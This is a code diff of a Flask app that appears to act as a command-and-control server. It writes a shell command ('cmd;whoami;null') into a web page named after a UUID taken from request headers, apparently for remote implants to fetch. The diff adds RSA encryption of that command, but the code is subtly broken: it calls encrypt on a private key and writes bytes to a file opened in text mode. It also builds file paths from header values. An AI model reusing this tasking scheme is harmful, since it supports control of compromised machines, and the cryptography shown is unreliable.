@@ -1,7 +1,17 @@
 from flask import *
-from string import ascii_letters, digits
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.asymmetric import padding
 
 app = Flask(__name__)
+
+with open("private_key.pem", "rb") as key_file:
+    private_key = serialization.load_pem_private_key(
+        key_file.read(),
+        password=None,
+        backend=default_backend()
+    )
 
 @app.route("/")
 def home():
@@ -12,10 +22,19 @@ def home():
         # If we recieve special characters just drop it entirely
         pass
     else:
+        message = b"cmd;whoami;null "
+        encrypted = private_key.encrypt(
+            message,
+            padding.OAEP(
+                mgf=padding.MGF1(algorithm=hashes.SHA256()),
+                algorithm=hashes.SHA256(),
+                label=None
+            )
+        )
         print(f'headers:{val}')
         # create a new page for the UUID we got from the headers
         f = open(f"/var/www/html/{val}.html", "a")
-        f.write("cmd;whoami;null ")
+        f.write(encrypted)
         f.close()
         return('found')
 
